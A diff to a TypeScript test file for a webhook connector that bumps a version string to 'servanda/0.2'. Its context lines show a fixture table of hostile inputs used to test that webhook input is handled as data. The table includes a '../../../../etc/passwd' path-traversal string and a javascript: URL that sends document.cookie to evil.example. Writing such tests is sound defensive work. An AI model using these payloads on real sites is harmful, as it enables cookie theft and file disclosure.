@@ -63,7 +63,7 @@ const HOSTILE_STRINGS: Record<string, string> = {
   control_chars: `a${BELL}b${ESC}[31mc${ch(0)}d${C1}e`,
   lone_surrogate: `lead ${LONE_SURROGATE} trail`,
   enormous: 'A'.repeat(2_000_000),
-  newlines: '{"v":"servanda/0.1"}\n'.repeat(500),
+  newlines: '{"v":"servanda/0.2"}\n'.repeat(500),
   empty: '',
   path_traversal: '../../../../etc/passwd',
   javascript_url: 'javascript:fetch("https://evil.example/"+document.cookie)',
@@ -196,7 +196,7 @@ describe('M-6: webhook input is data — a connector emits valid §2 envelopes o
     expect(envelope.kind).toBe('push');
     expect(envelope.source).toBe('github');
     expect(envelope.persona).toBe(PERSONA);
-    expect(envelope.v).toBe('servanda/0.1');
+    expect(envelope.v).toBe('servanda/0.2');
     expect(envelope.type).toBe('envelope');
     expect(envelope.received_at).toBe(RECEIVED);
   });
